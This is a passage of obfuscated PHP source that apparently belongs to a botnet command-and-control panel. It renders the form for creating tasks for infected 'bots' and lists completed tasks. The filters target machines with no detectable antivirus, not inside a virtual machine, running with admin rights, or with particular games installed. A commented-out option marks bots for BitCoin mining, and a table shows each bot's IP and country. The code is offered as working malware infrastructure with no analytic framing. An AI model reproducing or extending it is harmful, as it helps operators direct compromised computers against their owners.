                                                            _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("Only execute on bots that ...", 17, "top: -7px; font-size: 10px; face: font-family: Tahoma;", "left: 2px");
                                                            echo "\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 160px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_dotnet\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_mask_options & TASK_OPTION_HAS_DOTNET) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n                Have .NET Framework\r\n              </label>\r\n              <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 280px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_used_rdp\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_mask_options & TASK_OPTION_HAS_USED_RDP) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n                Has used Windows Remote Desktop at some point\r\n              </label>\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 200px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_admin\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_mask_options & TASK_OPTION_HAS_ADMIN_PRIVS) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n                Are running with administrative privileges\r\n              </label>\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 340px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_no_virtual_machine\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_mask_general_options & TASK_GENERAL_OPTION_NO_VIRTUAL_MACHINE) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n                Are <strong>not</strong> running inside a virtual machine\r\n              </label>\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 350px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_only_samsung\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_mask_options & BOT_ATTRIBUTE_HAS_SAMSUNG_DEVICE) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n                Has been connected to a Samsung device (phone/tablet) at some point\r\n              </label>\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 350px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_only_apple\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_mask_options & BOT_ATTRIBUTE_HAS_APPLE_DEVICE) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n                Has been connected to a Apple device (phone/tablet) at some point\r\n              </label>\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 200px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_only_no_av\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_mask_general_options & TASK_GENERAL_OPTION_NO_ANTIVIRUS) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n                Have no detectable anti-virus running\r\n              </label>\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 340px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_new_only\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_mask_general_options & TASK_GENERAL_OPTION_NEW_CLIENT_ONLY) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n                Is a new bot\r\n              </label>\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 340px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_old_only\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_mask_general_options & TASK_GENERAL_OPTION_OLD_CLIENT_ONLY) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n                Is an older bot (First contacted server <strong>more</strong> than 24 hours ago)\r\n              </label>\r\n\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 340px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_old6_only\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_mask_general_options & TASK_GENERAL_OPTION_OLD6H_CLIENT_ONLY) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n                Is an older bot (First contacted server more than  <strong>6</strong> hours ago)\r\n              </label>\r\n\t\t\t  <br />\r\n\t\t\t  <br />\r\n\t\t\t  \r\n\t\t\t<table class=\"table-bordered\" style=\"width: 900px; background-color: #FAFAFA; position: relative; top: -4px;\">\r\n\t\t\t\t<tr>\r\n\t\t\t\t\t<td width=\"99%\">\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<span style=\"position: relative; left: 6px; top: -9px; font-size: 11px; face: font-family: Tahoma;\">\r\n\t\t\t\t\t\t<strong>More specific options</strong>\r\n\t\t\t\t  \r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<span style=\"position: relative; top: 6px; font-size: 11px; face: font-family: Tahoma;\">\r\n\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 300px;\">\r\n\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_mark_only_favorites\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_mask_general_options & TASK_GENERAL_OPTION_ONLY_FAVORITES) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n\t\t\t\t\t\tOnly execute this task on <strong>Favorite</strong> bots.\r\n\t\t\t\t\t\t</label>\r\n\t\t\t\t  \r\n\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 300px;\">\r\n\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_mark_no_favorites\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_mask_general_options & TASK_GENERAL_OPTION_NO_FAVORITES) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n\t\t\t\t\t\tDo <i>not</i> execute this task on Favorite bots.\r\n\t\t\t\t\t\t</label>\r\n\t\t\t\t  \r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t<span style=\"position: relative; top: 6px; font-size: 11px; face: font-family: Tahoma;\">\r\n\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 300px;\">\r\n\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_mark_as_dirty\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_mask_general_options & TASK_GENERAL_OPTION_MARK_AS_DIRTY) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n\t\t\t\t\t\tMark any bot that performs this task as 'Dirty'\r\n\t\t\t\t\t\t</label>\r\n\t\t\t\t  \r\n\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 300px;\">\r\n\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_ignore_if_dirty\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_mask_general_options & TASK_GENERAL_OPTION_IGNORE_IF_DIRTY) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n\t\t\t\t\t\tDo not apply this task to any bots already marked as dirty\r\n\t\t\t\t\t\t</label>\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 340px;\">\r\n\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_apply_if_dirty\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_mask_general_options & TASK_GENERAL_OPTION_APPLY_IF_DIRTY) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n\t\t\t\t\t\tOnly apply this task to any bots <strong>currently marked as dirty</strong>\r\n\t\t\t\t\t\t</label>\r\n\t\t\t\t\t\t</span>\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t<br />\r\n\t\t\t\t  \r\n\t\t\t\t\t\t<div style=\"font-size: 11px; face: font-family: Tahoma;\">\r\n\t\t\t\t\t\t  <div class=\"accordion\" id=\"accordion2\">\r\n\t\t\t\t\t\t\t<a class=\"accordion-toggle\" data-toggle=\"collapse\" data-parent=\"#accordion2\" href=\"#collapseOne\">\r\n\t\t\t\t\t\t\tClick here to select filters based on specific installed software\r\n\t\t\t\t\t\t\t</a>\r\n\t\t\t\t\t\t  </div>\r\n\t\t\t\t\t\t  <div id=\"collapseOne\" class=\"accordion-body collapse\" style=\"height: 0px;\">\r\n\t\t\t\t\t\t\t\t\t<fieldset>\r\n\t\t\t\t\t\t\t\t\t  <div class=\"control-group\">\r\n\t\t\t\t\t\t\t\t\t\t<div class=\"controls\">\r\n\t\t\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t\t\t  <span style=\"position: relative; top: -8px\">\r\n\t\t\t\t\t\t\t\t\t\t  Apply task if each of the following are installed ...\r\n\t\t\t\t\t\t\t\t\t\t  </span>\r\n\t\t\t\t\t\t\t\t\t\t  <br />\r\n\t\t\t\t\t\t\t\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma\">\r\n\t\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_soft_java\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_software & BOT_SOFTWARE_JAVA) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n\t\t\t\t\t\t\t\t\t\t\tHas Java\r\n\t\t\t\t\t\t\t\t\t\t  </label>\r\n\t\t\t\t\t\t\t\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma\">\r\n\t\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_soft_skype\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_software & BOT_SOFTWARE_SKYPE) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n\t\t\t\t\t\t\t\t\t\t\tHas Skype\r\n\t\t\t\t\t\t\t\t\t\t  </label>\r\n\t\t\t\t\t\t\t\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma\">\r\n\t\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_soft_visualstudio\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_software & BOT_SOFTWARE_VISUAL_STUDIO) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n\t\t\t\t\t\t\t\t\t\t\tHas some version of Visual Studio\r\n\t\t\t\t\t\t\t\t\t\t  </label>\r\n\t\t\t\t\t\t\t\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma\">\r\n\t\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_soft_vmware\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_software & BOT_SOFTWARE_VM_SOFTWARE) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n\t\t\t\t\t\t\t\t\t\t\tHas VMPlayer or VMWorkstation\r\n\t\t\t\t\t\t\t\t\t\t  </label>\r\n\t\t\t\t\t\t\t\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 300px;\">\r\n\t\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_soft_origin\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_software & BOT_SOFTWARE_ORIGIN_CLIENT) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n\t\t\t\t\t\t\t\t\t\t\tHas Origin gaming platform\r\n\t\t\t\t\t\t\t\t\t\t  </label>\r\n\t\t\t\t\t\t\t\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 300px;\">\r\n\t\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_steam\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_mask_options & TASK_OPTION_HAS_STEAM) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n\t\t\t\t\t\t\t\t\t\t\tHas Steam gaming platform\r\n\t\t\t\t\t\t\t\t\t\t  </label>\r\n\t\t\t\t\t\t\t\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 300px;\">\r\n\t\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_soft_blizzard\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_software & BOT_SOFTWARE_BLIZZARD) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n\t\t\t\t\t\t\t\t\t\t\tHas Blizzard gaming platform\r\n\t\t\t\t\t\t\t\t\t\t  </label>\r\n\t\t\t\t\t\t\t\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma\">\r\n\t\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_soft_lol\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_software & BOT_SOFTWARE_LEAGUE_OF_LEGENDS) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n\t\t\t\t\t\t\t\t\t\t\tHas League of Legends\r\n\t\t\t\t\t\t\t\t\t\t  </label>\r\n\t\t\t\t\t\t\t\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma\">\r\n\t\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_soft_runescape\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_software & BOT_SOFTWARE_RUNESCAPE) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n\t\t\t\t\t\t\t\t\t\t\tHas Runescape\r\n\t\t\t\t\t\t\t\t\t\t  </label>\r\n\t\t\t\t\t\t\t\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma\">\r\n\t\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_soft_minecraft\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_software & BOT_SOFTWARE_MINECRAFT) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n\t\t\t\t\t\t\t\t\t\t\tHas Minecraft\r\n\t\t\t\t\t\t\t\t\t\t  </label>\r\n\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t</fieldset>\r\n\t\t\t\t\t\t  </div>\r\n\t\t\t\t\t\t</div>\r\n\t\t\t\t  \r\n\t\t\t\t\t</span>\r\n\t\t\t\t\t</td>\r\n\t\t\t\t</tr>\r\n\t\t\t</table>\r\n\t\t\t  \r\n\t\t\t  <!--\r\n              <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 200px;\">\r\n                <input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_bitcoin\" style=\"position: relative; top: -1px\" >\r\n                Are recommended for BitCoin mining\r\n              </label>-->\r\n            </div>\r\n          </div>\r\n\t\t  <br />\r\n          <div class=\"control-group\">\r\n\t\t  <label style=\"font-size: 11px; face: font-family: Tahoma\">Operating Systems this task applies to ...</label>\r\n            <label class=\"control-label\" for=\"multiSelect\"></label>\r\n            <div class=\"controls\">\r\n              <select multiple id=\"multiSelect\" style=\"font-size: 10px; face: font-family: Tahoma; height: 120px; ";
                                                            echo $task_operating_systems_error;
                                                            echo "\" name=\"task_operating_systems[]\">\r\n\t\t\t  ";
                                                            $fm_sel = "selected=\"selected\"";
                                                            echo "                <option value=\"all\" ";
                                                            echo !$e_task_os ? $fm_sel : "";
                                                            echo ">All Operating Systems</option>\r\n                <option value=\"w8\" ";
                                                            echo $e_task_os & WINDOWS_VERSION_W8 ? $fm_sel : "";
                                                            echo ">Windows 8</option>\r\n                <option value=\"w7\" ";
                                                            echo $e_task_os & WINDOWS_VERSION_W7 ? $fm_sel : "";
                                                            echo ">Windows 7</option>\r\n                <option value=\"wv\" ";
                                                            echo $e_task_os & WINDOWS_VERSION_VS ? $fm_sel : "";
                                                            echo ">Windows Vista</option>\r\n                <option value=\"wxp\" ";
                                                            echo $e_task_os & WINDOWS_VERSION_XP ? $fm_sel : "";
                                                            echo ">Windows XP</option>\r\n                <option value=\"ws08\" ";
                                                            echo $e_task_os & WINDOWS_VERSION_S2008 ? $fm_sel : "";
                                                            echo ">Windows Server 2008</option>\r\n                <option value=\"ws03\" ";
                                                            echo $e_task_os & WINDOWS_VERSION_S2003 ? $fm_sel : "";
                                                            echo ">Windows Server 2003</option>\r\n              </select>\r\n            </div>\r\n          </div>\r\n\t\t  \r\n\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 200px;\">\r\n\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_32bit\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_mask_general_options & TASK_GENERAL_OPTION_32BIT) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n\t\t\t32 bit systems\r\n\t\t  </label>\r\n\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 200px;\">\r\n\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"task_options_64bit\" style=\"position: relative; top: -1px\" ";
                                                            if ($e_task_mask_general_options & TASK_GENERAL_OPTION_64BIT) {
                                                                echo "checked";
                                                            }
                                                            echo ">\r\n\t\t\t64 bit systems\r\n\t\t  </label>\r\n\t\t  \r\n\t\t<br />\r\n\t\t<br />\r\n\t\t\r\n\t\t<script>\r\n\t\t\tfunction verify_options() {\r\n\t\t\t\t// verify conflicting task filters are not selected at the same time\r\n\t\t\t\tvar ck1 = document.getElementsByName('task_options_apply_if_dirty');\r\n\t\t\t\tvar ck2 = document.getElementsByName('task_options_ignore_if_dirty');\r\n\t\t\t\tvar ck3 = document.getElementsByName('task_options_mark_only_favorites');\r\n\t\t\t\tvar ck4 = document.getElementsByName('task_options_mark_no_favorites');\r\n\t\t\t\tvar ck5 = document.getElementsByName('task_options_new_only');\r\n\t\t\t\tvar ck6 = document.getElementsByName('task_options_old_only');\r\n\r\n\t\t\t\tif ( ck1[0].checked == true && ck2[0].checked == true ) {\r\n\t\t\t\t\talert('You cannot select both task filters: \\'Ignore if bot is dirty\\' and \\'Apply if bot is dirty\\'.\\n\\nPlease choose one or the other and try again.');\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t\tif ( ck3[0].checked == true && ck4[0].checked == true ) {\r\n\t\t\t\t\talert('You cannot select both task filters: \\'Apply only to favorites\\' and \\'Do not apply to favorites\\'.\\n\\nPlease choose one or the other and try again.');\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t\tif ( ck5[0].checked == true && ck6[0].checked == true ) {\r\n\t\t\t\t\talert('You cannot select both task filters: \\'Is new bot\\' and \\'Is an older bot\\'.\\n\\nPlease choose one or the other and try again.');\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t\treturn true;\r\n\t\t\t}\r\n\t\t</script>\r\n\t\t\r\n\t\t<!-- Submit button and border -->\r\n\t\t<table class=\"table-bordered\" style=\"width: 900px; background-color: #FAFAFA; position: relative; top: -4px;\">\r\n\t\t\t<tr>\r\n\t\t\t\t<td width=\"99%\">\r\n\t\t\t\t\t<br />\r\n\t\t\t\t\t<span style=\"position: relative; left: 6px; top: -9px; font-size: 11px; face: font-family: Tahoma;\">\r\n\t\r\n\t\t\t\t\t<input type=\"submit\" name=\"task_save\" onclick=\"return verify_options();\" value=\"";
                                                            echo $es_task_action == "add" ? "Add Task" : "Edit Task";
                                                            echo "\" class=\"btn btn-primary\" style=\"font-size: 11px; face: font-family: Tahoma\">\r\n\r\n\t\t\t\t\t</span>\r\n\t\t\t\t</td>\r\n\t\t\t</tr>\r\n\t\t</table>\r\n\t\t\r\n        </fieldset>\r\n\t\t</form>\r\n\t\t</font>\r\n\t\t\r\n\t\t\t<script>\r\n\t\t\t\t\$(function ()\r\n\t\t\t\t{\r\n\t\t\t\t\t\$(\"#dw_filetype_tip\").popover();\r\n\t\t\t\t\t\$(\"#dw_dlldrop_tip\").popover();\r\n\t\t\t\t}\r\n\t\t\t\t);\r\n\t\t\t</script>\r\n\t\t\t\r\n\t\t\t\r\n\t\t\t\t";
                                                        }
                                                    }
                                                } else {
                                                    if ($es_task_action != "viewc") {
                                                        echo "\r\n\t\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\r\n\t\t\t\t</table>\r\n\t\t\t\t\r\n\t\t\t\t";
                                                        echo "\t\t\t\t\r\n\t\t\t\t<br />\r\n\t\t\t\t\r\n\t\t\t\t\t<font size=\"1\" face=\"Tahoma\">\r\n\t\t\t\t\t<!-- Bot list table -->\r\n\t\t\t\t\t<table class=\"table table-bordered table-condensed table-striped\" align=\"center\" valign=\"top\">\r\n\t\t\t\t\t\t\t<thead>\r\n\t\t\t\t\t\t\t  <tr>\r\n\t\t\t\t\t\t\t\t<th width=\"170\">Task Name</th>\r\n\t\t\t\t\t\t\t\t<th width=\"200\">Type</th>\r\n\t\t\t\t\t\t\t\t<th width=\"125\">Created</th>\r\n\t\t\t\t\t\t\t\t<th width=\"125\"><center>Executed / Max / Failed</th>\r\n\t\t\t\t\t\t\t\t<th width=\"110\">Status</th>\r\n\t\t\t\t\t\t\t\t<th width=\"225\">Options</th>\r\n\t\t\t\t\t\t\t  </tr>\r\n\t\t\t\t\t\t\t</thead>\r\n\t\t\t\t\t\t\t<tbody>\r\n\t\t\t\t\t";
                                                        $current_index = 0;
                                                        for ($start_at = ($pp_current_task_view_page - 1) * $max_per_page; $current_row = @mysql_fetch_assoc($all_tasks); $current_index++) {
                                                            if ($start_at <= $current_index && $current_index < $start_at + $max_per_page) {
                                                                _obfuscated_0D5B091204282D2F350921221F273E1D1F390D1B0C1D01_($current_row["id"], $current_row["name"], $current_row["command"], $current_row["cmd_hash"], $current_row["task_type"], $current_row["creation_date"], $current_row["bots_executed"], $current_row["max_bots"], $current_row["bots_failed"], $current_row["status"], $current_row["expiration_date"]);
                                                            }
                                                        }
                                                        echo "\t\t\t\t\t\t\t</tbody>\r\n\t\t\t\t\t</table>\r\n\t\t\t\t\t<center>\r\n\t\t\t\t\t";
                                                        _obfuscated_0D0A1B251B251F2C1036213E1B065B24010C1F3B042911_(true);
                                                        _obfuscated_0D1C08281828312E2801110E012122212235041D173B01_($pp_current_task_view_page, $max_per_page, $total_num_tasks, "task_page");
                                                        _obfuscated_0D1D13360F190502082F110F39373B390B5B2F14252601_(true);
                                                        echo "\t\t\t\t\t<br /></center>\r\n\t\t\t\t\t</font>\r\n\r\n\t\t\t\t</td>\r\n\t\t\t</tr>\r\n\t\t\t</table>\r\n\t\t\t\r\n\t\t";
                                                    } else {
                                                        if ($es_task_action == "viewc" && isset($_GET["tid"]) && is_numeric($_GET["tid"])) {
                                                            global $sqlTasks;
                                                            $view_type_sql = isset($_GET["view_type"]) && $_GET["view_type"] == "failed" ? "AND completion_status = " . TASK_COMPLETION_STATUS_ERROR : "";
                                                            $tsk_id = (int) $_GET["tid"];
                                                            $db_name = SQL_DATABASE;
                                                            $max_per_page = 25;
                                                            $all_completed_tasks = $sqlTasks->Query("SELECT * FROM " . $db_name . ".tasks_completed LEFT JOIN " . $db_name . ".clients ON " . $db_name . ".tasks_completed.client_id=" . $db_name . ".clients.id WHERE " . $db_name . ".tasks_completed.task_id=" . $tsk_id . " " . $view_type_sql);
                                                            $total_num_com_bots = $all_completed_tasks ? @mysql_num_rows($all_completed_tasks) : 0;
                                                            $base_url = _obfuscated_0D361335101B2F261B0F053626220415152F332F083222_("&task_action=viewc&tid=" . $tsk_id);
                                                            $task_info = $sqlTasks->GetTask($tsk_id);
                                                            if ($task_info["status"] == TASK_STATUS_FINISHED) {
                                                                $task_status_string = "<font color=\"#339900\">Completed</font>";
                                                            } else {
                                                                if ($sqlTasks->IsTaskExpired($task_info["expiration_date"]) == true) {
                                                                    $task_status_string = "<font color=\"#E80000\">Expired</font>";
                                                                } else {
                                                                    if ($task_info["status"] == TASK_STATUS_SUSPENDED) {
                                                                        $task_status_string = "<font color=\"#E80000\">Suspended</font>";
                                                                    } else {
                                                                        if ($task_info["status"] == TASK_STATUS_ACTIVE) {
                                                                            $task_status_string = "Pending completion";
                                                                        } else {
                                                                            $task_status_string = "<font color=\"#E80000\">Unknown</font>";
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                            $view_failed_only_tag_begin = "";
                                                            $view_failed_only_tag_end = "";
                                                            if (isset($_GET["view_type"]) && $_GET["view_type"] == "failed") {
                                                                $view_failed_only_tag_begin = "<strong>";
                                                                $view_failed_only_tag_end = "</strong>";
                                                            }
                                                            $view_all_tag_begin = "";
                                                            $view_all_tag_end = "";
                                                            if (!isset($_GET["view_type"]) || $_GET["view_type"] === "" || $_GET["view_type"] === "all") {
                                                                $view_all_tag_begin = "<strong>";
                                                                $view_all_tag_end = "</strong>";
                                                            }
                                                            echo "\t\t\t\t\r\n\t\t\t\t\t<table class=\"table-bordered table-condensed\" align=\"center\" style=\"width: 1200px;\">\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t\t<strong>Bots who have completed task #";
                                                            echo $tsk_id . " (" . $task_status_string . ")";
                                                            echo "</strong>\r\n\t\t\t\t\t\t\t\t<br /><br />\r\n\t\t\t\t\t\t\t\t<font style=\"font-style: normal; font-weight: normal; font-size: 11px; face: font-family: Tahoma;\">\r\n\t\t\t\t\t\t\t\t<table class=\"table table-condensed\" style=\"padding: 1px;\">\r\n\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t<td width=\"8%\" style=\"border: hidden; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\"><strong>Name: &nbsp;</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t<td width=\"92%\" style=\"border: hidden; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">";
                                                            echo htmlspecialchars($task_info["name"]);
                                                            echo "</td>\r\n\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t<td width=\"8%\" style=\"border: hidden; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\"><strong>Executed: &nbsp;</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t<td width=\"92%\" style=\"border: hidden; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">";
                                                            echo $task_info["bots_executed"];
                                                            echo "</td>\r\n\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t<td width=\"8%\" style=\"border: hidden; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\"><strong>Failed: &nbsp;</strong></td>\r\n\t\t\t\t\t\t\t\t\t\t<td width=\"92%\" style=\"border: hidden; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">";
                                                            echo $task_info["bots_failed"];
                                                            echo "</td>\r\n\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t</table>\r\n\r\n\t\t\t\t\t\t\t\t";
                                                            echo $view_all_tag_begin;
                                                            echo "<a href=\"";
                                                            echo $base_url;
                                                            echo "\">View All</a>";
                                                            echo $view_all_tag_end;
                                                            echo " &nbsp;|&nbsp; ";
                                                            echo $view_failed_only_tag_begin;
                                                            echo "<a href=\"";
                                                            echo $base_url . "&view_type=failed";
                                                            echo "\">View failed executions only</a>";
                                                            echo $view_failed_only_tag_end;
                                                            echo "\t\t\t\t\t\t\t\t</font>\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t</table>\r\n\t\t\t\t\t\r\n\t\t\t\t\t<br />\r\n\t\t\t\t\t\r\n\t\t\t\t\t<font size=\"1\" face=\"Tahoma\">\r\n\t\t\t\t\t<!-- Bot list table -->\r\n\t\t\t\t\t<table class=\"table table-bordered table-condensed table-striped\" align=\"center\" valign=\"top\" style=\"font-size: 10px; face: font-family: Tahoma;\">\r\n\t\t\t\t\t\t\t<thead>\r\n\t\t\t\t\t\t\t  <tr>\r\n\t\t\t\t\t\t\t\t<th width=\"90\">Bot IP</th>\r\n\t\t\t\t\t\t\t\t<th width=\"150\">Country</th>\r\n\t\t\t\t\t\t\t\t<th width=\"120\">Date completed</th>\r\n\t\t\t\t\t\t\t\t<th width=\"80\">Status</th>\r\n\t\t\t\t\t\t\t\t<th width=\"280\">Additional Information</th>\r\n\t\t\t\t\t\t\t  </tr>\r\n\t\t\t\t\t\t\t</thead>\r\n\t\t\t\t\t\t\t<tbody>\r\n\t\t\t\t\t";
                                                            $current_index = 0;
                                                            for ($start_at = ($pp_current_task_bots_page - 1) * $max_per_page; $current_row = @mysql_fetch_assoc($all_completed_tasks); $current_index++) {
                                                                if ($start_at <= $current_index && $current_index < $start_at + $max_per_page) {
